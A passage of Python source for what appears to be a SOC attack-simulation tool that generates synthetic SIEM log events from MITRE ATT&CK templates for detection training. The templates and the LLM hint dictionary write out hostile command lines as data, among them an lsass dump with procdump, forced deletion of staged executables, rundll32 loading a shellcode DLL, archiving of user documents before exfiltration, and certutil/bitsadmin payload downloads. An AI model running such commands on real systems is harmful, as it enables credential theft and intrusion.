            "status_code": 200,
            "bytes": 483328,
            "user_agent": "Microsoft BITS/7.8",
            "client_ip": "{src_ip}",
            "hostname": "{hostname}",
            "content_type": "application/octet-stream",
        },
    },
    {
        "technique_id": "T1070.004",
        "tactic": "defense-evasion",
        "log_source": "sysmon",
        "severity": "medium",
        "title_template": "Artifact files deleted to cover tracks on {hostname}",
        "payload_template": {
            "EventID": "23",
            "Computer": "{hostname}",
            "User": "{username}",
            "Image": "C:\\Windows\\System32\\cmd.exe",
            "TargetFilename": "C:\\Users\\Public\\beacon.exe",
            "CommandLine": "del /f /q C:\\Users\\Public\\*.exe && forfiles /p %TEMP% /m stage*.exe /c \"cmd /c del @file\"",
        },
    },
    {
        "technique_id": "T1036",
        "tactic": "defense-evasion",
        "log_source": "edr",
        "severity": "high",
        "title_template": "Process masquerading as svchost.exe from non-system path on {hostname}",
        "payload_template": {
            "alert_name": "Binary Masquerading",
            "process_name": "svchost.exe",
            "process_path": "C:\\Users\\{username}\\AppData\\Local\\Temp\\svchost.exe",
            "expected_path": "C:\\Windows\\System32\\svchost.exe",
            "hash": "{file_hash}",
            "signer": "unsigned",
            "action_taken": "alerted",
            "hostname": "{hostname}",
            "parent_process": "C:\\Windows\\System32\\cmd.exe",
        },
    },
    {
        "technique_id": "T1036",
        "tactic": "defense-evasion",
        "log_source": "sysmon",
        "severity": "medium",
        "title_template": "Executable renamed to mimic legitimate Windows binary on {hostname}",
        "payload_template": {
            "EventID": "11",
            "Computer": "{hostname}",
            "User": "{username}",
            "Image": "C:\\Windows\\System32\\cmd.exe",
            "TargetFilename": "C:\\Windows\\Temp\\lsm.exe",
            "CreationUtcTime": "2026-06-04T12:00:00.000Z",
            "Hashes": "SHA256={file_hash}",
        },
    },
    {
        "technique_id": "T1018",
        "tactic": "discovery",
        "log_source": "windows_eventlog",
        "severity": "medium",
        "title_template": "Remote system discovery — network enumeration by {username} on {hostname}",
        "payload_template": {
            "EventID": "4688",
            "Computer": "{hostname}",
            "SubjectUserName": "{username}",
            "ProcessName": "C:\\Windows\\System32\\net.exe",
            "CommandLine": "net view /domain:{domain}",
            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
            "NewProcessId": "0x3d2c",
        },
    },
    {
        "technique_id": "T1018",
        "tactic": "discovery",
        "log_source": "sysmon",
        "severity": "medium",
        "title_template": "ICMP sweep — ping scan of internal network from {hostname}",
        "payload_template": {
            "EventID": "3",
            "Computer": "{hostname}",
            "User": "{username}",
            "Image": "C:\\Windows\\System32\\PING.EXE",
            "CommandLine": "ping -n 1 {server_ip}",
            "DestinationIp": "{server_ip}",
            "DestinationPort": "0",
            "Protocol": "icmp",
        },
    },
    {
        "technique_id": "T1090",
        "tactic": "command-and-control",
        "log_source": "firewall",
        "severity": "medium",
        "title_template": "C2 traffic routed through SOCKS proxy from {hostname}",
        "payload_template": {
            "src_ip": "{src_ip}",
            "dst_ip": "{c2_ip}",
            "dst_port": 1080,
            "protocol": "TCP",
            "action": "allow",
            "bytes_out": 12288,
            "proxy_type": "SOCKS5",
            "hostname": "{hostname}",
            "app_protocol": "SOCKS",
        },
    },
    {
        "technique_id": "T1497",
        "tactic": "defense-evasion",
        "log_source": "edr",
        "severity": "low",
        "title_template": "Anti-analysis VM/sandbox detection checks on {hostname}",
        "payload_template": {
            "alert_name": "Sandbox Evasion",
            "process_name": "{malware}",
            "hash": "{file_hash}",
            "checks": ["CPUID_hypervisor", "registry_vmware", "process_list_analysis", "sleep_acceleration"],
            "vm_detected": False,
            "action_taken": "alerted",
            "hostname": "{hostname}",
            "user": "{username}",
        },
    },
    {
        "technique_id": "T1218",
        "tactic": "defense-evasion",
        "log_source": "windows_eventlog",
        "severity": "high",
        "title_template": "Signed binary proxy execution via rundll32 on {hostname}",
        "payload_template": {
            "EventID": "4688",
            "Computer": "{hostname}",
            "SubjectUserName": "{username}",
            "ProcessName": "C:\\Windows\\System32\\rundll32.exe",
            "CommandLine": "rundll32.exe C:\\Users\\Public\\shellcode.dll,DllRegisterServer",
            "ParentProcessName": "C:\\Users\\{username}\\AppData\\Roaming\\{malware}",
            "NewProcessId": "0x5d2c",
        },
    },
    {
        "technique_id": "T1568",
        "tactic": "command-and-control",
        "log_source": "dns",
        "severity": "medium",
        "title_template": "DGA domain query — algorithmically generated C2 domain from {hostname}",
        "payload_template": {
            "query": "{c2_domain}",
            "query_type": "A",
            "answer": "{c2_ip}",
            "client_ip": "{src_ip}",
            "dga_score": 0.94,
            "entropy": 4.2,
            "alexa_rank": None,
            "hostname": "{hostname}",
        },
    },
    {
        "technique_id": "T1570",
        "tactic": "lateral-movement",
        "log_source": "windows_eventlog",
        "severity": "high",
        "title_template": "Lateral tool transfer via SMB share to {server}",
        "payload_template": {
            "EventID": "5145",
            "Computer": "{server}",
            "SubjectUserName": "{username}",
            "ShareName": "\\\\{server}\\ADMIN$",
            "RelativeTargetName": "Temp\\update.exe",
            "AccessMask": "0x2",
            "IpAddress": "{src_ip}",
            "AccessList": "WriteData (or AddFile)",
        },
    },
    {
        "technique_id": "T1588.002",
        "tactic": "resource-development",
        "log_source": "proxy",
        "severity": "medium",
        "title_template": "Download of offensive security tooling from public source",
        "payload_template": {
            "url": "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0/mimikatz_trunk.zip",
            "method": "GET",
            "status_code": 200,
            "bytes": 1458000,
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "client_ip": "{src_ip}",
            "hostname": "{hostname}",
            "category": "hacking_tools",
        },
    },
    {
        "technique_id": "T1543",
        "tactic": "persistence",
        "log_source": "windows_eventlog",
        "severity": "high",
        "title_template": "Malicious service installed for persistence on {hostname}",
        "payload_template": {
            "EventID": "7045",
            "Computer": "{hostname}",
            "ServiceName": "WindowsUpdateService",
            "ServiceFileName": "C:\\Windows\\Temp\\svchost32.exe -k netsvcs",
            "ServiceType": "user mode service",
            "StartType": "auto start",
            "ServiceAccount": "LocalSystem",
        },
    },
    {
        "technique_id": "T1560",
        "tactic": "collection",
        "log_source": "sysmon",
        "severity": "high",
        "title_template": "Data archived with 7zip before exfiltration on {hostname}",
        "payload_template": {
            "EventID": "4688",
            "Computer": "{hostname}",
            "SubjectUserName": "{username}",
            "ProcessName": "C:\\Program Files\\7-Zip\\7z.exe",
            "CommandLine": "7z.exe a -mx9 -p{file_hash} C:\\Temp\\archive.7z C:\\Users\\{username}\\Documents\\*.docx",
            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        },
    },
    {
        "technique_id": "T1048",
        "tactic": "exfiltration",
        "log_source": "firewall",
        "severity": "critical",
        "title_template": "Large data exfiltration over non-standard protocol from {hostname}",
        "payload_template": {
            "src_ip": "{src_ip}",
            "dst_ip": "{c2_ip}",
            "dst_port": 53,
            "protocol": "UDP",
            "action": "allow",
            "bytes_out": 4718592,
            "session_count": 1240,
            "exfil_method": "DNS_TXT_tunneling",
            "hostname": "{hostname}",
        },
    },
    {
        "technique_id": "T1003",
        "tactic": "credential-access",
        "log_source": "edr",
        "severity": "critical",
        "title_template": "Credential dumping attempt via procdump on {hostname}",
        "payload_template": {
            "alert_name": "OS Credential Dumping",
            "process_name": "procdump64.exe",
            "hash": "{file_hash}",
            "target_process": "lsass.exe",
            "commandline": "procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp",
            "parent_process": "C:\\Windows\\System32\\cmd.exe",
            "action_taken": "alerted",
            "hostname": "{hostname}",
            "user": "{username}",
        },
    },
    {
        "technique_id": "T1566",
        "tactic": "initial-access",
        "log_source": "email_security",
        "severity": "high",
        "title_template": "Phishing email with malicious link delivered to {username}",
        "payload_template": {
            "sender": "billing@{c2_domain}",
            "recipient": "{email}",
            "subject": "Urgent: Invoice payment overdue — review required",
            "body_urls": ["http://{c2_ip}/view", "https://{c2_domain}/track"],
            "verdict": "phishing",
            "link_reputation": "malicious",
            "client_ip": "{src_ip}",
            "hostname": "{hostname}",
        },
    },
    {
        "technique_id": "T1053",
        "tactic": "persistence",
        "log_source": "windows_eventlog",
        "severity": "high",
        "title_template": "Scheduled task created for persistence on {hostname}",
        "payload_template": {
            "EventID": "4698",
            "Computer": "{hostname}",
            "SubjectUserName": "{username}",
            "TaskName": "\\Microsoft\\Windows\\Update\\UpdateCheck",
            "TaskContent": "<Task><Actions><Exec><Command>C:\\Users\\Public\\payload.exe</Command></Exec></Actions></Task>",
            "Triggers": "daily at 03:00",
            "RunAs": "SYSTEM",
        },
    },
    {
        "technique_id": "T1071",
        "tactic": "command-and-control",
        "log_source": "proxy",
        "severity": "medium",
        "title_template": "Periodic C2 beacon over HTTP to {c2_ip} from {hostname}",
        "payload_template": {
            "url": "http://{c2_ip}/api/v2/status",
            "method": "GET",
            "status_code": 200,
            "bytes": 256,
            "user_agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
            "client_ip": "{src_ip}",
            "hostname": "{hostname}",
            "interval_seconds": 300,
        },
    },
    {
        "technique_id": "T1071",
        "tactic": "command-and-control",
        "log_source": "firewall",
        "severity": "medium",
        "title_template": "Suspicious outbound HTTPS to unknown IP on non-browser process",
        "payload_template": {
            "src_ip": "{src_ip}",
            "dst_ip": "{c2_ip}",
            "dst_port": 443,
            "protocol": "TCP",
            "action": "allow",
            "bytes_out": 1024,
            "bytes_in": 512,
            "hostname": "{hostname}",
            "process": "{malware}",
        },
    },
    {
        "technique_id": "T1406",
        "tactic": "defense-evasion",
        "log_source": "edr",
        "severity": "medium",
        "title_template": "Unusual process behavior with obfuscated activity on {hostname}",
        "payload_template": {
            "alert_name": "Suspicious Behavior",
            "process_name": "{malware}",
            "hash": "{file_hash}",
            "parent_process": "C:\\Windows\\System32\\cmd.exe",
            "action_taken": "alerted",
            "hostname": "{hostname}",
            "user": "{username}",
            "behavior_flags": ["obfuscation", "anti_analysis"],
        },
    },
]


# ── Per-technique behavior hints for LLM prompts ──────────────────────────────
# These give the LLM context about what realistic events look like for each TTP.

TECHNIQUE_BEHAVIOR_HINTS: dict[str, str] = {
    "T1566": "Spearphishing email: malicious attachment or link, email security logs show sender spoofing, macro execution spawns child process",
    "T1566.001": "Spearphishing attachment: Office macro in .xlsm/.docm spawns cmd.exe/powershell, EventID 4688 shows Office → cmd.exe parent chain",
    "T1190": "Web exploit: HTTP 500/200 on known vuln path, unusual process spawned from web server (w3wp.exe, httpd), shell commands in web logs",
    "T1133": "External VPN/RDP access from unusual geo IP, EventID 4624 LogonType=10, VPN appliance log shows new device/location",
    "T1059": "Command shell execution: cmd.exe/powershell spawned from unexpected parent, suspicious arguments (encoded, net, whoami)",
    "T1059.001": "PowerShell execution: -enc/-encodedcommand flags, bypassing execution policy, AMSI bypass attempts, EventID 4103/4104",
    "T1059.003": "Cmd.exe batch scripting: for loops over network resources, del/copy/net commands, spawned from Office or service",
    "T1047": "WMI execution: wmic.exe process call create, remote WMI via DCOM (EventID 4688 or Sysmon EventID 1)",
    "T1053": "Scheduled task for persistence: schtasks /create or EventID 4698, task name mimics Windows update, runs SYSTEM",
    "T1053.005": "Scheduled task: schtasks.exe /create command, EventID 4698, task runs attacker binary with SYSTEM privileges",
    "T1543": "Service installation: sc.exe create or EventID 7045, binpath points to attacker binary outside System32",
    "T1543.003": "Windows service: EventID 7045 new service installed, auto-start, runs as SYSTEM, binary path in user-writable location",
    "T1547.001": "Registry Run key persistence: reg add HKCU/HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run, Sysmon EventID 13",
    "T1548.002": "UAC bypass: known bypass technique (fodhelper, eventvwr, slui), elevation without UAC prompt, EventID 4688 high-integrity process",
    "T1027": "Obfuscation: base64/XOR encoded payloads in CommandLine, PowerShell -enc, unusual hex strings in script block logging",
    "T1055.001": "DLL injection: Sysmon EventID 8 (CreateRemoteThread), VirtualAllocEx+WriteProcessMemory in target process, EDR alert on injection",
    "T1070.001": "Event log cleared: EventID 1102 (Security log cleared), EventID 104 (System log cleared), wevtutil cl command",
    "T1070.004": "File deletion: del /f /q command, Sysmon EventID 23 (file delete), forensic artifact removal after staging",
    "T1036": "Masquerading: process binary in unusual path (TEMP, AppData) mimicking system binary name, unsigned binary with system name",
    "T1112": "Registry modification: reg.exe add/modify or Sysmon EventID 13, HKLM\\SYSTEM key changes, DisableAntiSpyware=1",
    "T1003": "Credential dumping: procdump lsass, Sysmon EventID 10 (LSASS access), EDR alert on credential access",
    "T1003.001": "LSASS dump: procdump64.exe -ma lsass.exe, Sysmon EventID 10 with GrantedAccess 0x1010, mimikatz sekurlsa::logonpasswords",
    "T1078": "Valid accounts with stolen credentials: successful login from unusual IP/time, EventID 4624 LogonType=3, abnormal working hours",
    "T1110.003": "Password spray: many failed auth (EventID 4625) against single user across many systems, then one success, low lockout rate",
    "T1550.002": "Pass-the-hash: NTLM auth from process that didn't prompt for password, EventID 4624 LogonType=3 with NtLmSsp",
    "T1082": "System discovery: systeminfo.exe, hostname, whoami /all, EventID 4688 multiple discovery commands in rapid succession",
    "T1016": "Network config discovery: ipconfig /all, arp -a, netstat -ano, route print, all within seconds of each other",
    "T1135": "Network share enumeration: net view /domain, net share, EventID 5140 (share access), WMI Win32_Share query",
    "T1018": "Remote system discovery: net view /domain, ping sweep, arp -a, netscan.exe, multiple EventID 4688 in rapid succession",
    "T1021.001": "RDP lateral movement: EventID 4624 LogonType=10 from internal IP, mstsc.exe usage, remote session artifacts",
    "T1021.002": "SMB/admin share: net use \\\\HOST\\ADMIN$, EventID 5140 share access, PsExec-style remote execution",
    "T1570": "Lateral tool transfer: file copy via SMB (EventID 5145), xcopy/robocopy to ADMIN$ or C$, tool dropped on remote host",
    "T1560": "Data archiving: 7z.exe or zip command compressing user data, unusual archive creation in staging directory",
    "T1560.001": "7z archiving: 7z.exe command with -p password flag, large archive created in temp, EventID 4688",
    "T1074.001": "Data staging: files copied to C:\\Temp or C:\\Users\\Public before exfil, multiple files moved in bulk",
    "T1071": "C2 beaconing: periodic HTTP/HTTPS outbound to same IP every N minutes, small payload, non-browser process making HTTP requests",
    "T1071.001": "HTTP C2 beacon: GET requests to hardcoded C2 IP at regular intervals, response triggers task execution",
    "T1071.004": "DNS C2: high-frequency DNS TXT/A queries to DGA domain, data encoded in subdomain labels",
    "T1573.001": "Encrypted C2 channel: TLS on non-standard port (not 443/80), long-lived session, periodic keepalive bytes",
    "T1041": "Exfil over C2: bulk POST/PUT to C2 IP over HTTPS, large bytes_out on established C2 channel",
    "T1048": "Exfil via alternative protocol: DNS tunneling (high TXT query volume), ICMP exfil, FTP to external IP",
    "T1048.003": "DNS exfiltration: unusually long subdomain queries, high volume TXT records, encoded data in domain labels",
    "T1105": "Tool download: certutil -urlcache, bitsadmin /transfer, PowerShell Invoke-WebRequest pulling EXE from C2",
    "T1090": "Proxy C2: SOCKS5/TOR traffic on port 1080/9050, traffic routed through anonymizing infrastructure",
    "T1568": "Dynamic resolution DGA: algorithmically generated domain queries, high entropy domain names, short TTL responses",
    "T1570": "Lateral tool transfer via SMB: file written to ADMIN$ share, EventID 5145 shows write access",
    "T1586.002": "Compromised account used for initial access: login from known-bad IP, password match but unusual geo",
    "T1588.002": "Offensive tool download: curl/wget downloading from github, pastebin, or file-sharing site — known tool (mimikatz, cobalt strike)",
    "T1218": "Signed binary proxy execution: rundll32/mshta/regsvr32 executing unusual DLL or script, LOLbin abuse",
    "T1218.011": "Rundll32: rundll32.exe executing unsigned DLL, suspicious arguments with export name or ordinal",
    "T1497": "Sandbox evasion: CPUID checks, sleep calls to beat sandbox timeout, checking for VM registry keys or process list",
    "T1486": "Ransomware encryption: vssadmin delete shadows, heavy file I/O renaming files to .encrypted/.locked, ransom note creation",
    "T1489": "Service disruption: net stop for backup/AV/SQL services, sc stop commands, EventID 7036 services stopping",
    "T1406": "Obfuscated/unusual process behavior, binary with anti-analysis flags, execution from non-standard location",
}


# ── Synthetic fallback pools ───────────────────────────────────────────────────

_SYNTHETIC_HOSTNAMES = ["CORP-WS-01", "CORP-WS-02", "DESKTOP-HR-03", "LAPTOP-FIN-04", "WS-IT-05"]
_SYNTHETIC_SERVER_HOSTNAMES = ["SERVER-DC01", "SERVER-FILE01", "SERVER-APP02", "SERVER-SQL01"]
_SYNTHETIC_IPS = ["192.168.1.10", "192.168.1.11", "192.168.1.45", "192.168.2.30", "10.10.5.22"]
_SYNTHETIC_SERVER_IPS = ["192.168.1.5", "192.168.1.6", "192.168.1.50", "10.10.1.5"]
_SYNTHETIC_USERNAMES = ["jsmith", "mwilliams", "agarcia", "blee", "sconner"]
_SYNTHETIC_EMAILS = [
    "jsmith@corp.local",
    "mwilliams@corp.local",
    "agarcia@corp.local",
    "blee@corp.local",
    "sconner@corp.local",
]
_SYNTHETIC_DOMAIN = "corp.local"


# ── Database helpers ──────────────────────────────────────────────────────────

async def get_asset_pool(db: AsyncSession, environment_id: str | None) -> dict[str, Any]:
    """Pull SimulatedEndpoints and SimulatedUsers for the environment.

    Returns a pool dict with lists of endpoint/server/user data.
    Falls back to synthetic defaults if no environment assets exist.
    """
    endpoints: list[dict[str, Any]] = []
    servers: list[dict[str, Any]] = []
    users: list[dict[str, Any]] = []

    if environment_id is not None:
        try:
            env_uuid = uuid.UUID(str(environment_id))
        except (ValueError, AttributeError):
            env_uuid = None

        if env_uuid is not None:
            ep_result = await db.execute(
                select(SimulatedEndpoint).where(
                    SimulatedEndpoint.environment_id == env_uuid
                )
            )
            for ep in ep_result.scalars().all():
                bucket = servers if "server" in ep.hostname.lower() or "dc" in ep.hostname.lower() else endpoints
                bucket.append(
                    {
                        "hostname": ep.hostname,
                        "ip_address": ep.ip_address,
                        "os_platform": ep.os_platform or "windows",
                    }
                )

            user_result = await db.execute(
                select(SimulatedUser).where(
                    SimulatedUser.environment_id == env_uuid
                )
            )
            for u in user_result.scalars().all():
                users.append(
                    {
                        "username": u.username,
                        "email": u.email,
                        "domain": u.email.split("@")[-1] if "@" in u.email else _SYNTHETIC_DOMAIN,
                    }
                )

    # Apply fallbacks where the environment has no records
    if not endpoints:
        endpoints = [
            {"hostname": h, "ip_address": ip, "os_platform": "windows"}
            for h, ip in zip(_SYNTHETIC_HOSTNAMES, _SYNTHETIC_IPS)
        ]
    if not servers:
        servers = [
            {"hostname": h, "ip_address": ip, "os_platform": "windows"}
            for h, ip in zip(_SYNTHETIC_SERVER_HOSTNAMES, _SYNTHETIC_SERVER_IPS)
        ]
    if not users:
        users = [
            {
                "username": u,
                "email": e,
                "domain": _SYNTHETIC_DOMAIN,
            }
            for u, e in zip(_SYNTHETIC_USERNAMES, _SYNTHETIC_EMAILS)
        ]

    domain = users[0]["domain"] if users else _SYNTHETIC_DOMAIN

    # Load product selections from environment settings (e.g. {"edr": "crowdstrike", "cloud": "aws"})
    products: dict[str, str] = {}
    if environment_id is not None:
        try:
            _env_uuid = uuid.UUID(str(environment_id))
            env_row = await db.get(Environment, _env_uuid)
            if env_row and env_row.settings and isinstance(env_row.settings, dict):
                products = env_row.settings.get("products", {}) or {}
        except Exception:
            pass

    return {
        "endpoints": endpoints,
        "servers": servers,
        "users": users,
        "domain": domain,
        "products": products,
    }


# ── Placeholder substitution ───────────────────────────────────────────────────

def _build_substitution_map(
    asset_pool: dict[str, Any],
    ioc_pool: list[dict[str, Any]],
    context: Any = None,   # SimulationContext | None
) -> dict[str, str]:
    """Build flat {placeholder: concrete_value} substitution map.

    When a SimulationContext is provided, its fixed entities take priority over
    random pool picks, ensuring all log sources in the same session reference the
    same victim user/hostname/IP — the "one PID, one LogonID, one timestamp" rule.
    """
    endpoints = asset_pool.get("endpoints") or []
    servers = asset_pool.get("servers") or []
    users = asset_pool.get("users") or []
    domain = asset_pool.get("domain", _SYNTHETIC_DOMAIN)

    if context is not None:
        # Use fixed context entities — session-coherent across all sources
        hostname = context.victim_hostname or (endpoints[0]["hostname"] if endpoints else _SYNTHETIC_HOSTNAMES[0])
        src_ip = context.victim_ip or (endpoints[0]["ip_address"] if endpoints else _SYNTHETIC_IPS[0])
        username = context.victim_username or (users[0]["username"] if users else "jsmith")
        email = context.victim_email or f"{username}@{context.domain or domain}"
        domain = context.domain or domain
        server_hostname = context.fileserver_hostname or (servers[0]["hostname"] if servers else _SYNTHETIC_SERVER_HOSTNAMES[0])
        server_ip = context.fileserver_ip or (servers[0]["ip_address"] if servers else _SYNTHETIC_SERVER_IPS[0])
        dc_hostname = context.dc_hostname or (servers[0]["hostname"] if servers else "SERVER-DC01")
        c2_ip = context.attacker_ip or "185.220.101.42"
        c2_domain = context.c2_domain or "updates.malicious-cdn.ru"
        c2_url = f"https://{c2_domain}/beacon"
        file_hash = context.malware_hash_sha256 or context.malware_hash_md5 or "44d88612fea8a8f36de82e1278abb02f3c8c6c5b4e2d1a9b8f7e6d5c4b3a291"
    else:
        # Fallback: random pool picks (pre-context behaviour)
        endpoint = random.choice(endpoints) if endpoints else {"hostname": _SYNTHETIC_HOSTNAMES[0], "ip_address": _SYNTHETIC_IPS[0]}
        server = random.choice(servers) if servers else {"hostname": _SYNTHETIC_SERVER_HOSTNAMES[0], "ip_address": _SYNTHETIC_SERVER_IPS[0]}
        dc = servers[0] if servers else {"hostname": "SERVER-DC01", "ip_address": "192.168.1.5"}
        user = random.choice(users) if users else {"username": "jsmith", "email": "jsmith@corp.local", "domain": domain}

        hostname = endpoint["hostname"]
        src_ip = endpoint["ip_address"]
        username = user["username"]
        email = user.get("email", f"{username}@{domain}")
        server_hostname = server["hostname"]
        server_ip = server["ip_address"]
        dc_hostname = dc["hostname"]

        # Pull IOC values by type from ioc_pool
        c2_ip = "185.220.101.42"
        c2_domain = "updates.malicious-cdn.ru"
        c2_url = "https://cdn.updates-service.ru/beacon"
        file_hash = "44d88612fea8a8f36de82e1278abb02f3c8c6c5b4e2d1a9b8f7e6d5c4b3a291"

        for ioc in ioc_pool:
            ioc_type = (ioc.get("type") or ioc.get("ioc_type") or "").lower()
            val = ioc.get("value") or ioc.get("indicator") or ""
            if not val:
                continue
            if ioc_type in ("ip", "ipv4", "ip-dst", "ip-src") and c2_ip == "185.220.101.42":
                c2_ip = val
            elif ioc_type in ("domain", "domain-name", "hostname") and c2_domain == "updates.malicious-cdn.ru":
                c2_domain = val
            elif ioc_type in ("url",) and c2_url == "https://cdn.updates-service.ru/beacon":
                c2_url = val
            elif ioc_type in ("sha256", "md5", "sha1", "hash", "file-hash") and file_hash.startswith("44d88"):
                file_hash = val

    return {
        "{hostname}": hostname,
        "{server}": server_hostname,
        "{dc}": dc_hostname,
        "{username}": username,
        "{email}": email,
        "{domain}": domain,
        "{src_ip}": src_ip,
        "{server_ip}": server_ip,
        "{c2_ip}": c2_ip,
        "{c2_domain}": c2_domain,
        "{c2_url}": c2_url,
        "{file_hash}": file_hash,
        "{b64_cmd}": "JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwA=",
        "{dest_port}": "443",
        "{malware}": (getattr(context, "malware_filename", None) or "ryuk.exe") if context else "ryuk.exe",
    }


def _substitute(obj: Any, subs: dict[str, str]) -> Any:
    """Recursively substitute placeholders in a dict/list/string structure."""
    if isinstance(obj, str):
        for placeholder, value in subs.items():
            obj = obj.replace(placeholder, str(value))
        return obj
    if isinstance(obj, dict):
        return {k: _substitute(v, subs) for k, v in obj.items()}
    if isinstance(obj, list):
        return [_substitute(item, subs) for item in obj]
    return obj


_LOG_SOURCE_SCHEMA: dict[str, dict[str, str]] = {
    "windows_eventlog": {"index": "windows",     "sourcetype": "WinEventLog:Security"},
    "sysmon":           {"index": "sysmon",       "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"},
    "edr_endpoint":     {"index": "crowdstrike",  "sourcetype": "crowdstrike:events"},
    "edr":              {"index": "crowdstrike",  "sourcetype": "crowdstrike:events"},
    "email_security":   {"index": "email",        "sourcetype": "o365:exchange:messageTrace"},
    "network_traffic":  {"index": "pan_log",      "sourcetype": "pan:traffic"},
    "proxy":            {"index": "pan_log",      "sourcetype": "pan:traffic"},
    "firewall":         {"index": "pan_log",      "sourcetype": "pan:traffic"},
    "cloud_trail":      {"index": "aws",          "sourcetype": "aws:cloudtrail"},
    "linux_auditd":     {"index": "linux_log",    "sourcetype": "linux:syslog"},
    "auth":             {"index": "windows",      "sourcetype": "WinEventLog:Security"},
    "dns":              {"index": "pan_log",      "sourcetype": "pan:dns"},
    "generic":          {"index": "main",         "sourcetype": "generic"},
}


def render_event(
    template: dict[str, Any],
    asset_pool: dict[str, Any],
    ioc_pool: list[dict[str, Any]],
    timestamp_offset: int = 0,
    context: Any = None,   # SimulationContext | None
) -> dict[str, Any]:
    """Render a template into a concrete event by substituting all placeholders.

    When a SimulationContext is supplied, victim/attacker entities are fixed
    across all sources (coherent multi-source simulation).
    Generates timestamp as utcnow() + offset seconds.
    Returns dict with keys: source_type, technique_id, severity, title, timestamp, payload.
    """
    subs = _build_substitution_map(asset_pool, ioc_pool, context=context)

    log_source = template.get("log_source", "windows_eventlog")
    # Use vendor-aware schema when environment products are configured;
    # fall back to the static _LOG_SOURCE_SCHEMA for unconditional log sources.
    _products = asset_pool.get("products") if isinstance(asset_pool.get("products"), dict) else {}
    if _products:
        schema = resolve_schema_for_component(log_source, _products)
    else:
        schema = _LOG_SOURCE_SCHEMA.get(log_source, {"index": "main", "sourcetype": log_source})

    ts = datetime.utcnow() + timedelta(seconds=timestamp_offset)
    title = _substitute(template.get("title_template", ""), subs)
    payload = _substitute(template.get("payload_template", {}), subs)

    # Embed SIEM schema fields so the frontend can show index/sourcetype
    payload["_index"] = schema["index"]
    payload["_sourcetype"] = schema["sourcetype"]
    payload["_log_source"] = log_source
    payload["_attack"] = True

    return {
        "source_type": log_source,
        "technique_id": template.get("technique_id", ""),
        "severity": template.get("severity", "medium"),
        "title": title,
        "timestamp": ts.strftime("%Y-%m-%dT%H:%M:%S.000Z"),
        "payload": payload,
    }


# ── DB query helpers ──────────────────────────────────────────────────────────

async def get_templates_for_technique(
    db: AsyncSession, technique_id: str
) -> list[dict[str, Any]]:
    """Return all templates for a technique from the DB."""
    from sqlalchemy import text as _text

    result = await db.execute(
        _text(
            "SELECT id, technique_id, tactic, log_source, severity, "
            "title_template, payload_template, variables, is_builtin, hit_count "
            "FROM ttp_event_templates WHERE technique_id = :tid"
        ),
        {"tid": technique_id},
    )
    rows = result.mappings().all()
    return [dict(r) for r in rows]


async def get_templates_for_techniques(
    db: AsyncSession, technique_ids: list[str]
) -> dict[str, list[dict[str, Any]]]:
    """Return templates grouped by requested technique_id with fuzzy parent matching.

    For each requested technique (e.g. T1071), first tries exact match, then
    falls back to sub-technique match (T1071.001, T1071.004 etc.) so that parent
    technique IDs still get covered.  Result keys are the REQUESTED technique_ids,
    not the DB technique_ids, so the caller always finds its key.
    """
    if not technique_ids:
        return {}

    from sqlalchemy import text as _text

    # Collect all unique base technique IDs (T1071 from T1071.001, etc.)
    base_ids = set(technique_ids)
    for tid in technique_ids:
        if "." not in tid:
            base_ids.add(tid)  # already base
        else:
            base_ids.add(tid.split(".")[0])

    result = await db.execute(
        _text(
            "SELECT id, technique_id, tactic, log_source, severity, "
            "title_template, payload_template, variables, is_builtin, hit_count "
            "FROM ttp_event_templates WHERE technique_id = ANY(:tids)"
        ),
        {"tids": list(base_ids)},
    )
    rows = result.mappings().all()

    # Index DB rows by their exact technique_id
    db_by_exact: dict[str, list[dict[str, Any]]] = {}
    for row in rows:
        r = dict(row)
        db_by_exact.setdefault(r["technique_id"], []).append(r)

    # Build result: for each requested technique, try exact then parent/child fallback
    grouped: dict[str, list[dict[str, Any]]] = {}
    for req_tid in technique_ids:
        # 1. Exact match
        if req_tid in db_by_exact:
            grouped[req_tid] = db_by_exact[req_tid]
            continue

        # 2. If requested is a parent (no dot), look for any sub-technique T1xxx.*
        if "." not in req_tid:
            sub_matches: list[dict[str, Any]] = []
            for db_tid, rows_list in db_by_exact.items():
                if db_tid.startswith(req_tid + "."):
                    sub_matches.extend(rows_list)
            if sub_matches:
                grouped[req_tid] = sub_matches
                continue

        # 3. If requested is a sub-technique, try its parent
        parent = req_tid.split(".")[0] if "." in req_tid else None
        if parent and parent in db_by_exact:
            grouped[req_tid] = db_by_exact[parent]
            continue

        # 4. Try BUILTIN_TEMPLATES in-memory with same fallback logic
        builtin_exact = [t for t in BUILTIN_TEMPLATES if t["technique_id"] == req_tid]
        if builtin_exact:
            grouped[req_tid] = builtin_exact
            continue
        if "." not in req_tid:
            builtin_sub = [t for t in BUILTIN_TEMPLATES if t["technique_id"].startswith(req_tid + ".")]
            if builtin_sub:
                grouped[req_tid] = builtin_sub
                continue
        if parent:
            builtin_parent = [t for t in BUILTIN_TEMPLATES if t["technique_id"] == parent]
            if builtin_parent:
                grouped[req_tid] = builtin_parent

    return grouped


# ── Placeholder parameterization ──────────────────────────────────────────────

_IP_RE = re.compile(r"\b(?:(?:10|172|192)\.\d{1,3}\.\d{1,3}\.\d{1,3}|185\.\d{1,3}\.\d{1,3}\.\d{1,3})\b")
_DOMAIN_RE = re.compile(r"\b[a-z0-9]([a-z0-9\-]{0,61}[a-z0-9])?\.(?:ru|cn|xyz|info|biz|onion|su|pw|cc)\b", re.I)
_HASH_RE = re.compile(r"\b[0-9a-fA-F]{32,64}\b")


def _parameterize_string(s: str) -> str:
    """Replace recognisable concrete values with generic placeholders."""
    s = _IP_RE.sub("{src_ip}", s)
    s = _DOMAIN_RE.sub("{c2_domain}", s)
    s = _HASH_RE.sub("{file_hash}", s)
    return s


def _parameterize(obj: Any) -> Any:
    """Recursively parameterize a dict/list/string."""
    if isinstance(obj, str):
        return _parameterize_string(obj)
